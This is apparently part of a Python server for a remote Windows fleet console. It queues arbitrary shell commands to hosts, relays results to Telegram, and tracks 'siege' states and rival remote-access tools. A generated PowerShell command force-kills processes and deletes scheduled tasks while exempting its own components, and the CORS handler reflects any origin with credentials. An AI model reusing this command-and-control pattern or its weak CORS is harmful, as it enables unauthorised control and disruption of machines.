#!/usr/bin/env python3
"""WinRTCS report service v5 + Sight console (sessions, jobs, tags, SLA, signing hooks)."""
from __future__ import annotations

import hashlib
import hmac
import html
import json
import re
import secrets
import sqlite3
import sys
import threading
import time
import urllib.parse
import urllib.request
from http.cookies import SimpleCookie
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

BASE = Path("/opt/winrtcs")
STATIC = BASE / "static"
DB = str(BASE / "fleet.db")
TOKEN = (BASE / "fetch_token").read_text().strip()
ADMIN = (BASE / "admin_token").read_text().strip()
TG = json.loads((BASE / "tg.json").read_text())
SESSION_SECRET = hashlib.sha256((ADMIN + ":sight-v5").encode()).digest()

sys.path.insert(0, str(BASE))
from jobs_catalog import JOBS, catalog_public, render_job  # noqa: E402

SILENCE_SECS = 26 * 3600
ONLINE_SECS = 10 * 60  # heartbeat every ~1 min
STALE_SECS = 4 * 3600
SILENCE_RESEND = 20 * 3600
SLA_WARN_SECS = 30 * 60  # escalate toward silence after 30m without beat
CMD_MAX_AGE = 24 * 3600
FLUSH_SECS = 120
TG_CHUNK = 3900
SESSION_TTL = 12 * 3600
JOB_MAX_ATTEMPTS = 3

_queue: list[str] = []
_lock = threading.Lock()
_sessions: dict[str, float] = {}


def db() -> sqlite3.Connection:
    c = sqlite3.connect(DB, timeout=30)
    c.execute("PRAGMA journal_mode=WAL")
    c.execute(
        """CREATE TABLE IF NOT EXISTS hosts(
        host TEXT PRIMARY KEY, state TEXT, streak INTEGER, extkill INTEGER,
        guard TEXT, siege TEXT, suspects TEXT, rmm TEXT, last_seen REAL,
        last_alert REAL DEFAULT 0)"""
    )
    for col, typ in [
        ("rmm", "TEXT"),
        ("last_beat", "REAL"),
        ("agent", "TEXT"),
        ("maint", "INTEGER DEFAULT 0"),
        ("rmm_prev", "TEXT"),
    ]:
        try:
            c.execute(f"ALTER TABLE hosts ADD COLUMN {col} {typ}")
        except Exception:
            pass
    c.execute(
        """CREATE TABLE IF NOT EXISTS cmds(
        id INTEGER PRIMARY KEY AUTOINCREMENT, ts REAL, target TEXT, cmd TEXT)"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS results(
        cmd_id INTEGER, host TEXT, ts REAL, rc TEXT, out TEXT,
        PRIMARY KEY(cmd_id, host))"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS jobs(
        id INTEGER PRIMARY KEY AUTOINCREMENT, ts REAL, name TEXT, target TEXT,
        params TEXT, cmd_id INTEGER, note TEXT, status TEXT DEFAULT 'queued',
        attempts INTEGER DEFAULT 0, max_attempts INTEGER DEFAULT 3,
        next_retry REAL DEFAULT 0, updated REAL)"""
    )
    for col, typ in [
        ("status", "TEXT DEFAULT 'queued'"),
        ("attempts", "INTEGER DEFAULT 0"),
        ("max_attempts", "INTEGER DEFAULT 3"),
        ("next_retry", "REAL DEFAULT 0"),
        ("updated", "REAL"),
    ]:
        try:
            c.execute(f"ALTER TABLE jobs ADD COLUMN {col} {typ}")
        except Exception:
            pass
    c.execute(
        """CREATE TABLE IF NOT EXISTS policy(
        id INTEGER PRIMARY KEY AUTOINCREMENT, ts REAL, kind TEXT, pattern TEXT,
        action TEXT, scope TEXT, note TEXT)"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS audit(
        id INTEGER PRIMARY KEY AUTOINCREMENT, ts REAL, actor TEXT, action TEXT,
        detail TEXT)"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS tags(
        id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT UNIQUE, note TEXT)"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS host_tags(
        host TEXT, tag TEXT, PRIMARY KEY(host, tag))"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS rmm_hist(
        id INTEGER PRIMARY KEY AUTOINCREMENT, ts REAL, host TEXT, rmm TEXT)"""
    )
    # seed dogfood tag
    c.execute("INSERT OR IGNORE INTO tags(name, note) VALUES('dogfood', 'staging ring')")
    c.execute("INSERT OR IGNORE INTO tags(name, note) VALUES('vip', 'high priority')")
    c.execute("INSERT OR IGNORE INTO tags(name, note) VALUES('office', 'office LAN')")
    return c


def audit(actor: str, action: str, detail: str) -> None:
    con = db()
    con.execute(
        "INSERT INTO audit(ts,actor,action,detail) VALUES(?,?,?,?)",
        (time.time(), actor[:64], action[:64], detail[:2000]),
    )
    con.commit()
    con.close()


def esc(s: object) -> str:
    return html.escape(str(s if s is not None else ""), quote=False)


def tg(text: str) -> None:
    try:
        data = urllib.parse.urlencode(
            {
                "chat_id": TG["chat_id"],
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": "true",
            }
        ).encode()
        req = urllib.request.Request(
            "https://api.telegram.org/bot%s/sendMessage" % TG["token"], data=data
        )
        urllib.request.urlopen(req, timeout=8)
    except Exception:
        pass


def alert(text: str) -> None:
    with _lock:
        _queue.append(text)


def alert_flusher() -> None:
    while True:
        time.sleep(FLUSH_SECS)
        with _lock:
            batch, _queue[:] = _queue[:], []
        msg = ""
        for item in batch:
            if len(msg) + len(item) + 2 > TG_CHUNK:
                tg(msg)
                msg = ""
            msg = (msg + "\n\n" + item) if msg else item
        if msg:
            tg(msg)


def utcnow() -> str:
    return time.strftime("%d %b %H:%M UTC", time.gmtime())


def state_emoji(state: str) -> str:
    s = (state or "").lower()
    if "fighting" in s:
        return "⚔️"
    if "healthy" in s and "siege" in s:
        return "🛡️"
    if "siege" in s:
        return "🚨"
    if "healthy" in s:
        return "✅"
    if "installing" in s:
        return "🔧"
    if "paused" in s:
        return "⏸️"
    if "recovering" in s:
        return "🩹"
    return "❓"


def fmt_new_host(host: str, state: str, guard: str) -> str:
    return (
        "🆕 <b>NEW HOST ONLINE</b>\n━━━━━━━━━━━━━━━━\n"
        f"🖥 <code>{esc(host)}</code>\n"
        f"{state_emoji(state)} State: <b>{esc(state)}</b>   🛰 Guard: <code>{esc(guard)}</code>\n"
        f"🕐 {utcnow()}"
    )


def fmt_state(host: str, old: str, new: str, f: dict) -> str:
    lines = [
        "🔄 <b>STATE CHANGE</b>",
        "━━━━━━━━━━━━━━━━",
        f"🖥 <code>{esc(host)}</code>",
        f"{state_emoji(old)} {esc(old)}  ➜  {state_emoji(new)} <b>{esc(new)}</b>",
        f"📈 streak {esc(f.get('streak', '0'))}   💀 extkill {esc(f.get('extkill', '0'))}",
    ]
    if f.get("siege"):
        lines.append(f"🚨 <b>SIEGE</b>: <code>{esc(f['siege'].rstrip(','))}</code>")
    if f.get("suspects") not in (None, "", "none"):
        lines.append(f"🕵️ suspects: <code>{esc(f['suspects'])}</code>")
    lines.append(f"🕐 {utcnow()}")
    return "\n".join(lines)


def _fmt_sc_segment(seg: str) -> str:
    fp = re.search(r"FP=(\S+)", seg)
    relay = re.search(r"relay=(\S+)", seg)
    tag = re.search(r"\[(\S+?)\]", seg)
    tagv = tag.group(1) if tag else "UNKNOWN"
    icon = {"gryxa": "🛰", "keeper-sevrz": "🔒"}.get(tagv, "⚠️")
    return (
        f"{icon} <b>ScreenConnect</b> · {esc(tagv)}\n"
        f"   🔑 <code>{esc(fp.group(1) if fp else '?')}</code>  "
        f"🌐 <code>{esc(relay.group(1) if relay else '?')}</code>"
    )


def _fmt_generic_segment(seg: str) -> str:
    name = seg.split(" ", 1)[0]
    return f"📡 <b>{esc(name)}</b>\n   <code>{esc(seg[:180])}</code>"


def fmt_rmm(host: str, detail: str) -> str:
    lines = [
        "🚨 <b>NEW / CHANGED RMM DETECTED</b>",
        "━━━━━━━━━━━━━━━━",
        f"🖥 <code>{esc(host)}</code>",
        "",
    ]
    for seg in detail.split(" || "):
        seg = seg.strip()
        if not seg:
            continue
        lines.append(
            _fmt_sc_segment(seg) if seg.startswith("ScreenConnect") else _fmt_generic_segment(seg)
        )
        lines.append("")
    lines.append(f"🕐 {utcnow()}")
    return "\n".join(lines).strip()


def fmt_silent(host: str, state: str, hours: float) -> str:
    return (
        "🔇 <b>MACHINE SILENT</b>\n━━━━━━━━━━━━━━━━\n"
        f"🖥 <code>{esc(host)}</code>\n"
        f"⏰ No report for <b>{hours:.1f}h</b>   "
        f"(last state: {state_emoji(state)} {esc(state)})\n"
        f"🕐 {utcnow()}"
    )


def fmt_sla(host: str, mins: float) -> str:
    return (
        "⏰ <b>SILENT SLA WARNING</b>\n━━━━━━━━━━━━━━━━\n"
        f"🖥 <code>{esc(host)}</code>\n"
        f"No heartbeat for <b>{mins:.0f}m</b> (threshold {SLA_WARN_SECS//60}m)\n"
        f"🕐 {utcnow()}"
    )


def fmt_cmd_result(host: str, cid: int, rc: str, out: str) -> str:
    out = (out or "").strip()
    if len(out) > 2400:
        out = "…[truncated]…\n" + out[-2400:]
    if not out:
        out = "(no output)"
    rc_icon = "✅" if rc.strip() in ("RC=0", "0") else ("⏱" if "timeout" in rc else "⚠️")
    return (
        "📟 <b>CMD #" + str(cid) + " RESULT</b>\n━━━━━━━━━━━━━━━━\n"
        f"🖥 <code>{esc(host)}</code>   {rc_icon} "
        f"<code>{esc(rc.replace('RC=', 'exit '))}</code>\n"
        f"<pre>{esc(out)}</pre>\n🕐 {utcnow()}"
    )


def classify_presence(last_beat: float | None, last_seen: float | None, now: float) -> str:
    ts = last_beat or last_seen or 0
    age = now - ts
    if age <= ONLINE_SECS:
        return "online"
    if age <= STALE_SECS:
        return "stale"
    return "silent"


def parse_rmm(rmm: str) -> list[dict]:
    out: list[dict] = []
    if not rmm or rmm in ("-", "none"):
        return out
    for part in rmm.split(";"):
        part = part.strip()
        if not part:
            continue
        tag = "other"
        m = re.search(r"\[(\w[\w-]*)\]", part)
        if m:
            tag = m.group(1)
        kind = "sc" if part.startswith("SC:") or "ScreenConnect" in part else "rmm"
        out.append({"raw": part[:200], "kind": kind, "tag": tag})
    return out


def expand_target(target: str) -> list[str]:
    """Expand ALL / @group / host into concrete host list for job fan-out metadata.
    Agent still receives ALL or single host in cmds table; @group fans out to per-host cmds.
    """
    t = target.strip()
    if t == "ALL":
        return ["ALL"]
    if t.startswith("@"):
        tag = t[1:]
        con = db()
        rows = con.execute("SELECT host FROM host_tags WHERE tag=?", (tag,)).fetchall()
        con.close()
        return [r[0] for r in rows] or []
    return [t[:64]]


def queue_cmd(target: str, cmd: str, job_name: str = "", params: dict | None = None) -> list[int]:
    """Queue one or more cmds. @group expands to per-host. Returns cmd ids."""
    hosts = expand_target(target)
    if not hosts:
        raise ValueError(f"no hosts for target {target}")
    ids: list[int] = []
    con = db()
    now = time.time()
    for h in hosts:
        cur = con.execute(
            "INSERT INTO cmds(ts,target,cmd) VALUES(?,?,?)", (now, h[:64], cmd[:4000])
        )
        cid = int(cur.lastrowid)
        if job_name:
            con.execute(
                """INSERT INTO jobs(ts,name,target,params,cmd_id,note,status,attempts,max_attempts,updated)
                   VALUES(?,?,?,?,?,?, 'queued', 1, ?, ?)""",
                (
                    now,
                    job_name[:64],
                    h[:64],
                    json.dumps(params or {}),
                    cid,
                    "",
                    JOB_MAX_ATTEMPTS,
                    now,
                ),
            )
        ids.append(cid)
    con.commit()
    con.close()
    return ids


def session_new() -> str:
    tok = secrets.token_urlsafe(32)
    _sessions[tok] = time.time() + SESSION_TTL
    return tok


def session_ok(tok: str | None) -> bool:
    if not tok:
        return False
    exp = _sessions.get(tok)
    if not exp or exp < time.time():
        _sessions.pop(tok, None)
        return False
    _sessions[tok] = time.time() + SESSION_TTL
    return True


def fleet_payload() -> dict:
    con = db()
    rows = con.execute(
        """SELECT host,state,streak,extkill,guard,siege,suspects,rmm,last_seen,
                  last_beat,agent,maint FROM hosts ORDER BY host"""
    ).fetchall()
    tagmap: dict[str, list[str]] = {}
    for host, tag in con.execute("SELECT host, tag FROM host_tags").fetchall():
        tagmap.setdefault(host, []).append(tag)
    last_res = con.execute(
        """SELECT r.host, r.cmd_id, r.rc, r.ts, c.cmd FROM results r
           JOIN cmds c ON c.id=r.cmd_id ORDER BY r.ts DESC"""
    ).fetchall()
    con.close()
    last_by: dict[str, dict] = {}
    for host, cid, rc, ts, cmd in last_res:
        if host not in last_by:
            failed = rc.strip() not in ("RC=0", "0") and "timeout" not in (rc or "").lower()
            last_by[host] = {
                "cmd_id": cid,
                "rc": rc,
                "ts": ts,
                "cmd": (cmd or "")[:120],
                "failed": failed,
            }
    now = time.time()
    hosts = []
    counts = {
        "total": 0,
        "online": 0,
        "stale": 0,
        "silent": 0,
        "healthy": 0,
        "installing": 0,
        "paused": 0,
        "siege": 0,
        "nonkeeper_rmm": 0,
        "maint": 0,
        "gryxa": 0,
        "no_gryxa": 0,
    }
    for h, state, streak, extkill, guard, siege, suspects, rmm, ts, beat, agent, maint in rows:
        counts["total"] += 1
        presence = classify_presence(beat, ts, now)
        counts[presence] += 1
        st = (state or "").lower()
        if "healthy" in st:
            counts["healthy"] += 1
        if "installing" in st:
            counts["installing"] += 1
        if "paused" in st:
            counts["paused"] += 1
        if "siege" in st or (siege or "").strip():
            counts["siege"] += 1
        if maint:
            counts["maint"] += 1
        entries = parse_rmm(rmm or "")
        nonkeeper = [
            e for e in entries if e["tag"] not in ("gryxa", "keeper-sevrz") and e["raw"] != "none"
        ]
        if nonkeeper:
            counts["nonkeeper_rmm"] += 1
        has_gryxa = any(e.get("tag") == "gryxa" for e in entries) or (
            "healthy" in st and "installing" not in st
        )
        if has_gryxa:
            counts["gryxa"] += 1
        else:
            counts["no_gryxa"] += 1
        ref = beat or ts or 0
        age = now - ref
        sla_left = max(0, int((SILENCE_SECS - age) / 60))
        hosts.append(
            {
                "host": h,
                "state": state,
                "streak": streak,
                "extkill": extkill,
                "guard": guard,
                "agent": agent or "",
                "siege": siege or "",
                "suspects": suspects or "",
                "rmm": rmm or "",
                "rmm_entries": entries,
                "nonkeeper": nonkeeper,
                "has_gryxa": has_gryxa,
                "last_seen": ts,
                "last_beat": beat,
                "seen": f"{int((now-(ts or 0))/60)}m ago" if ts else "—",
                "beat": f"{int((now-beat)/60)}m ago" if beat else "—",
                "presence": presence,
                "maint": bool(maint),
                "tags": tagmap.get(h, []),
                "sla_minutes_left": sla_left,
                "last_cmd": last_by.get(h),
            }
        )
    return {"generated": now, "counts": counts, "hosts": hosts, "jobs": catalog_public()}


class H(BaseHTTPRequestHandler):
    def _cookie_session(self) -> str | None:
        raw = self.headers.get("Cookie", "")
        sc = SimpleCookie()
        try:
            sc.load(raw)
        except Exception:
            return None
        morsel = sc.get("sight_session")
        return morsel.value if morsel else None

    def _auth_fetch(self) -> bool:
        return self.headers.get("Authorization") == "Bearer " + TOKEN

    def _auth_admin(self) -> bool:
        if self.headers.get("Authorization") == "Bearer " + ADMIN:
            return True
        return session_ok(self._cookie_session())

    def _deny(self) -> None:
        self.send_response(403)
        self.end_headers()

    def _text(self, body, code: int = 200, ctype: str = "text/plain; charset=utf-8", headers: dict | None = None) -> None:
        data = body if isinstance(body, bytes) else body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Cache-Control", "no-store")
        if headers:
            for k, v in headers.items():
                self.send_header(k, v)
        self.end_headers()
        self.wfile.write(data)

    def _json(self, obj: object, code: int = 200, headers: dict | None = None) -> None:
        self._text(json.dumps(obj), code, "application/json; charset=utf-8", headers)

    def _fields(self) -> dict:
        n = min(int(self.headers.get("Content-Length", 0) or 0), 5 * 1024 * 1024)
        raw = self.rfile.read(n).decode(errors="replace")
        ctype = self.headers.get("Content-Type", "")
        if "application/json" in ctype:
            try:
                return json.loads(raw) if raw else {}
            except Exception:
                return {}
        f: dict[str, str] = {}
        for kv in raw.split("&"):
            if "=" in kv:
                k, v = kv.split("=", 1)
                f[urllib.parse.unquote_plus(k)] = urllib.parse.unquote_plus(v)
        return f

    def log_message(self, *a) -> None:
        pass

    def do_OPTIONS(self) -> None:
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", self.headers.get("Origin", "*"))
        self.send_header("Access-Control-Allow-Credentials", "true")
        self.send_header("Access-Control-Allow-Headers", "Authorization, Content-Type")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS")
        self.end_headers()

    def do_POST(self) -> None:
        path = self.path.split("?", 1)[0]
        if path == "/report":
            return self._post_report() if self._auth_fetch() else self._deny()
        if path == "/heartbeat":
            return self._post_heartbeat() if self._auth_fetch() else self._deny()
        if path == "/cmd/result":
            return self._post_result() if self._auth_fetch() else self._deny()
        if path == "/api/login":
            return self._post_login()
        if path in ("/cmd", "/api/cmd"):
            return self._post_cmd() if self._auth_admin() else self._deny()
        if path == "/api/jobs":
            return self._post_job() if self._auth_admin() else self._deny()
        if path == "/api/policy":
            return self._post_policy() if self._auth_admin() else self._deny()
        if path == "/api/policy/enforce":
            return self._enforce_policy() if self._auth_admin() else self._deny()
        if path == "/api/rmm/kick":
            return self._post_rmm_kick() if self._auth_admin() else self._deny()
        if path == "/api/tags":
            return self._post_tags() if self._auth_admin() else self._deny()
        if path == "/api/maint":
            return self._post_maint() if self._auth_admin() else self._deny()
        if path == "/api/suspects/promote":
            return self._promote_suspect() if self._auth_admin() else self._deny()
        if path == "/api/logout":
            return self._logout()
        self._text("not found", 404)

    def do_DELETE(self) -> None:
        path, _, qs = self.path.partition("?")
        q = urllib.parse.parse_qs(qs)
        if not self._auth_admin():
            return self._deny()
        if path == "/api/policy":
            return self._del_policy(q)
        if path == "/api/tags":
            return self._del_tag(q)
        self._text("not found", 404)

    def do_GET(self) -> None:
        path, _, qs = self.path.partition("?")
        q = urllib.parse.parse_qs(qs)
        if path in ("/sight", "/sight/", "/sight/index.html"):
            return self._sight()
        if path == "/api/fleet":
            return self._json(fleet_payload()) if self._auth_admin() else self._deny()
        if path == "/api/jobs":
            return self._json({"jobs": catalog_public()}) if self._auth_admin() else self._deny()
        if path == "/api/jobs/status":
            return self._jobs_status() if self._auth_admin() else self._deny()
        if path == "/api/cmds" or path == "/cmd/list":
            if not self._auth_admin():
                return self._deny()
            return self._api_cmds() if path.startswith("/api/") else self._get_cmdlist()
        if path.startswith("/api/cmd/"):
            if not self._auth_admin():
                return self._deny()
            try:
                return self._api_cmd_detail(int(path.rsplit("/", 1)[-1]))
            except ValueError:
                return self._json({"error": "bad id"}, 400)
        if path == "/api/policy":
            return self._api_policy() if self._auth_admin() else self._deny()
        if path == "/api/audit":
            return self._api_audit() if self._auth_admin() else self._deny()
        if path == "/api/tags":
            return self._api_tags() if self._auth_admin() else self._deny()
        if path == "/api/rmm/history":
            return self._rmm_history() if self._auth_admin() else self._deny()
        if path == "/api/pastes":
            return self._pastes() if self._auth_admin() else self._deny()
        if path == "/hostcfg":
            return self._hostcfg(q) if self._auth_fetch() else self._deny()
        if path == "/map":
            return self._get_map() if self._auth_fetch() else self._deny()
        if path == "/cmd/poll":
            return self._get_poll(q) if self._auth_fetch() else self._deny()
        if path == "/cmd/get":
            return self._get_cmd(q) if self._auth_fetch() else self._deny()
        self._text("not found", 404)

    # -------- auth / sight --------
    def _post_login(self) -> None:
        f = self._fields()
        tok = str(f.get("token", "")).strip()
        if not hmac.compare_digest(tok, ADMIN):
            return self._json({"error": "bad token"}, 403)
        sid = session_new()
        cookie = f"sight_session={sid}; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age={SESSION_TTL}"
        audit("admin", "login", "sight session")
        self._json({"ok": True}, headers={"Set-Cookie": cookie})

    def _logout(self) -> None:
        sid = self._cookie_session()
        if sid:
            _sessions.pop(sid, None)
        self._json(
            {"ok": True},
            headers={"Set-Cookie": "sight_session=; Path=/; HttpOnly; Secure; Max-Age=0"},
        )

    def _sight(self) -> None:
        p = STATIC / "index.html"
        if not p.is_file():
            return self._text("sight UI missing", 500)
        self._text(p.read_text(encoding="utf-8"), 200, "text/html; charset=utf-8")

    # -------- fleet agent --------
    def _post_report(self) -> None:
        f = self._fields()
        host = f.get("host", "?")[:64]
        state = f.get("state", "?")[:64]
        rmm = f.get("rmm", "")[:500]
        rmm_new = f.get("rmm_new", "").strip()
        now = time.time()
        con = db()
        row = con.execute(
            "SELECT state, rmm, maint FROM hosts WHERE host=?", (host,)
        ).fetchone()
        old = row[0] if row else None
        old_rmm = row[1] if row else None
        maint = int(row[2] or 0) if row else 0
        if old_rmm and old_rmm != rmm:
            con.execute(
                "INSERT INTO rmm_hist(ts,host,rmm) VALUES(?,?,?)", (now, host, old_rmm[:500])
            )
        con.execute(
            """INSERT INTO hosts(host,state,streak,extkill,guard,siege,suspects,rmm,last_seen,rmm_prev)
            VALUES(?,?,?,?,?,?,?,?,?,?)
            ON CONFLICT(host) DO UPDATE SET state=excluded.state, streak=excluded.streak,
            extkill=excluded.extkill, guard=excluded.guard, siege=excluded.siege,
            suspects=excluded.suspects, rmm_prev=hosts.rmm, rmm=excluded.rmm, last_seen=excluded.last_seen""",
            (
                host,
                state,
                f.get("streak", "0"),
                f.get("extkill", "0"),
                f.get("guard", "?"),
                f.get("siege", ""),
                f.get("suspects", ""),
                rmm,
                now,
                old_rmm or "",
            ),
        )
        con.commit()
        con.close()
        if not maint:
            if old is None:
                alert(fmt_new_host(host, state, f.get("guard", "?")))
            elif old != state:
                alert(fmt_state(host, old, state, f))
            if rmm_new:
                alert(fmt_rmm(host, rmm_new[:2500]))
        self._text("ok")

    def _post_heartbeat(self) -> None:
        f = self._fields()
        host = f.get("host", "?")[:64]
        agent = f.get("agent", "")[:32]
        guard = f.get("guard", "")[:32]
        now = time.time()
        con = db()
        con.execute(
            """INSERT INTO hosts(host,state,streak,extkill,guard,siege,suspects,rmm,last_seen,last_beat,agent)
               VALUES(?,?,0,0,?,?, '','', ?, ?, ?)
               ON CONFLICT(host) DO UPDATE SET last_beat=excluded.last_beat, agent=excluded.agent,
               guard=CASE WHEN excluded.guard!='' THEN excluded.guard ELSE hosts.guard END""",
            (host, "?", guard, "", now, now, agent),
        )
        maint = con.execute("SELECT maint FROM hosts WHERE host=?", (host,)).fetchone()
        con.commit()
        con.close()
        m = int(maint[0] or 0) if maint else 0
        self._text(f"MAINT={m}\nOK=1\n")

    def _hostcfg(self, q: dict) -> None:
        host = (q.get("host", [""])[0])[:64]
        con = db()
        row = con.execute("SELECT maint FROM hosts WHERE host=?", (host,)).fetchone()
        tags = [t[0] for t in con.execute("SELECT tag FROM host_tags WHERE host=?", (host,))]
        con.close()
        m = int(row[0] or 0) if row else 0
        self._text(f"MAINT={m}\nTAGS={','.join(tags)}\n")

    def _post_result(self) -> None:
        f = self._fields()
        try:
            cid = int(f.get("id", "0"))
        except ValueError:
            cid = 0
        host = f.get("host", "?")[:64]
        rc = f.get("rc", "?")[:40]
        out = f.get("out", "")[:20000]
        if not cid:
            return self._text("bad id", 400)
        now = time.time()
        con = db()
        con.execute(
            "INSERT OR REPLACE INTO results(cmd_id,host,ts,rc,out) VALUES(?,?,?,?,?)",
            (cid, host, now, rc, out),
        )
        ok = rc.strip() in ("RC=0", "0")
        status = "done" if ok else "failed"
        con.execute(
            "UPDATE jobs SET status=?, updated=? WHERE cmd_id=?", (status, now, cid)
        )
        # schedule retry for failed named jobs
        if not ok:
            row = con.execute(
                "SELECT id, attempts, max_attempts, name, target, params FROM jobs WHERE cmd_id=?",
                (cid,),
            ).fetchone()
            if row and row[1] < row[2]:
                con.execute(
                    "UPDATE jobs SET status='queued', next_retry=?, updated=? WHERE id=?",
                    (now + 120, now, row[0]),
                )
        con.commit()
        con.close()
        alert(fmt_cmd_result(host, cid, rc, out))
        self._text("ok")

    def _post_cmd(self) -> None:
        f = self._fields()
        target = str(f.get("target", "")).strip()[:64]
        cmd = str(f.get("cmd", "")).strip()[:4000]
        if not target or not cmd:
            return self._json({"error": "need target + cmd"}, 400)
        try:
            ids = queue_cmd(target, cmd)
        except ValueError as exc:
            return self._json({"error": str(exc)}, 400)
        audit("admin", "raw_cmd", f"ids={ids} target={target}")
        if self.path.startswith("/api/"):
            return self._json({"queued": ids[0], "ids": ids, "target": target})
        self._text(f"queued id={ids[0]} target={target}")

    def _post_job(self) -> None:
        f = self._fields()
        name = str(f.get("name", "")).strip()
        target = str(f.get("target", "")).strip()[:64]
        params = f.get("params") or {}
        if isinstance(params, str):
            try:
                params = json.loads(params)
            except Exception:
                params = {"fp": params}
        if name not in JOBS:
            return self._json({"error": f"unknown job {name}"}, 400)
        try:
            body = render_job(name, params if isinstance(params, dict) else {})
            ids = queue_cmd(target, body, job_name=name, params=params if isinstance(params, dict) else {})
        except (ValueError, KeyError) as exc:
            return self._json({"error": str(exc)}, 400)
        audit("admin", "job", f"{name} -> {target} ids={ids}")
        alert(
            f"🛠 <b>JOB QUEUED</b>\n━━━━━━━━━━━━━━━━\n"
            f"📦 <code>{esc(name)}</code> → <code>{esc(target)}</code>\n"
            f"🆔 {esc(','.join(str(i) for i in ids))}\n🕐 {utcnow()}"
        )
        self._json({"queued": ids[0], "ids": ids, "job": name, "target": target})

    def _post_policy(self) -> None:
        f = self._fields()
        kind = str(f.get("kind", "rmm")).strip()[:32]
        pattern = str(f.get("pattern", "")).strip()[:200]
        action = str(f.get("action", "watch")).strip()[:32]
        scope = str(f.get("scope", "ALL")).strip()[:64] or "ALL"
        note = str(f.get("note", "")).strip()[:200]
        if not pattern or action not in ("allow", "watch", "remove"):
            return self._json({"error": "pattern + action(allow|watch|remove)"}, 400)
        con = db()
        cur = con.execute(
            "INSERT INTO policy(ts,kind,pattern,action,scope,note) VALUES(?,?,?,?,?,?)",
            (time.time(), kind, pattern, action, scope, note),
        )
        pid = cur.lastrowid
        con.commit()
        con.close()
        audit("admin", "policy_add", f"id={pid} {action} {pattern} @{scope}")
        self._json({"id": pid, "ok": True})

    def _del_policy(self, q: dict) -> None:
        try:
            pid = int((q.get("id") or ["0"])[0])
        except ValueError:
            pid = 0
        con = db()
        con.execute("DELETE FROM policy WHERE id=?", (pid,))
        con.commit()
        con.close()
        audit("admin", "policy_del", f"id={pid}")
        self._json({"ok": True})

    def _enforce_policy(self) -> None:
        con = db()
        policies = con.execute(
            "SELECT kind,pattern,action,scope FROM policy WHERE action='remove'"
        ).fetchall()
        con.close()
        queued = []
        for kind, pattern, action, scope in policies:
            target = scope if scope else "ALL"
            if kind == "scfp":
                try:
                    body = render_job("kick-sc-fp", {"fp": pattern.lower()})
                    ids = queue_cmd(target, body, "kick-sc-fp", {"fp": pattern})
                    queued.extend(ids)
                except ValueError:
                    continue
            elif kind in ("match", "taskname", "rmm"):
                # watch/remove → queue a scoped killer for the pattern (safe charset)
                safe = re.sub(r"[^A-Za-z0-9_\-\.]", "", pattern)[:120]
                if not safe:
                    continue
                body = (
                    "powershell -NoProfile -NonInteractive -Command "
                    f"\"$ErrorActionPreference='SilentlyContinue'; $pat='{safe}'; "
                    "Get-CimInstance Win32_Process | Where-Object { "
                    "$_.CommandLine -and ($_.CommandLine -match $pat) "
                    "-and ($_.CommandLine -notmatch 'ScreenConnect|winrtcs') "
                    "-and ($_.ProcessId -ne $PID) } | ForEach-Object { "
                    "Stop-Process -Id $_.ProcessId -Force; "
                    "Write-Output ('proc_killed '+$_.Name) }; "
                    "$raw=& schtasks.exe /Query /FO CSV /V 2>$null; if($raw){ "
                    "$csv=$raw|ConvertFrom-Csv; foreach($t in $csv){ "
                    "$tn=[string]$t.TaskName; $a=[string]$t.'Task To Run'; "
                    "if(($tn -match $pat -or $a -match $pat) "
                    "-and ($tn -notmatch 'WinRTCS') -and ($a -notmatch 'winrtcs')){ "
                    "& schtasks.exe /Delete /TN $tn /F 2>$null | Out-Null; "
                    "Write-Output ('task_killed '+$tn) } } }; "
                    "Write-Output 'POLICY_ENFORCE_DONE'\""
                )
                ids = queue_cmd(target, body, "policy-enforce", {"pattern": safe})
                queued.extend(ids)
            else:
                ids = queue_cmd(target, render_job("kick-unknown-sc"), "kick-unknown-sc", {})
                queued.extend(ids)
        audit("admin", "policy_enforce", f"queued={queued}")
        self._json({"queued": queued, "count": len(queued), "message": f"queued {len(queued)} kicks"})

    def _post_rmm_kick(self) -> None:
        f = self._fields()
        target = str(f.get("target", "")).strip()[:64]
        fp = str(f.get("fp", "")).strip().lower()
        if not target:
            return self._json({"error": "need target"}, 400)
        if fp:
            try:
                body = render_job("kick-sc-fp", {"fp": fp})
                name = "kick-sc-fp"
            except ValueError as exc:
                return self._json({"error": str(exc)}, 400)
        else:
            body = render_job("kick-unknown-sc")
            name = "kick-unknown-sc"
        ids = queue_cmd(target, body, name, {"fp": fp})
        audit("admin", "rmm_kick", f"{name} -> {target}")
        self._json({"queued": ids[0], "ids": ids, "job": name})

    def _post_tags(self) -> None:
        f = self._fields()
        host = str(f.get("host") or f.get("assign_host") or "").strip()[:64]
        tags_in = f.get("tags")
        if isinstance(tags_in, str):
            tags_in = [t.strip() for t in tags_in.split(",") if t.strip()]
        single = str(f.get("tag") or "").strip()[:64]
        if host and (tags_in or single or f.get("action") == "assign"):
            tag_list = [str(t).strip()[:64] for t in (tags_in or ([single] if single else []))]
            tag_list = [t for t in tag_list if t]
            if not tag_list:
                return self._json({"error": "tags required"}, 400)
            con = db()
            for tag in tag_list:
                con.execute("INSERT OR IGNORE INTO tags(name,note) VALUES(?,?)", (tag, ""))
                con.execute(
                    "INSERT OR IGNORE INTO host_tags(host,tag) VALUES(?,?)", (host, tag)
                )
            con.commit()
            con.close()
            audit("admin", "tag_assign", f"{host} +{','.join(tag_list)}")
            return self._json({"ok": True, "host": host, "tags": tag_list})
        name = str(f.get("name", "")).strip()[:64]
        note = str(f.get("note", "")).strip()[:200]
        if not name:
            return self._json({"error": "name required"}, 400)
        con = db()
        con.execute("INSERT OR IGNORE INTO tags(name,note) VALUES(?,?)", (name, note))
        con.commit()
        con.close()
        audit("admin", "tag_create", name)
        self._json({"ok": True})

    def _del_tag(self, q: dict) -> None:
        tag = (q.get("tag") or [""])[0][:64]
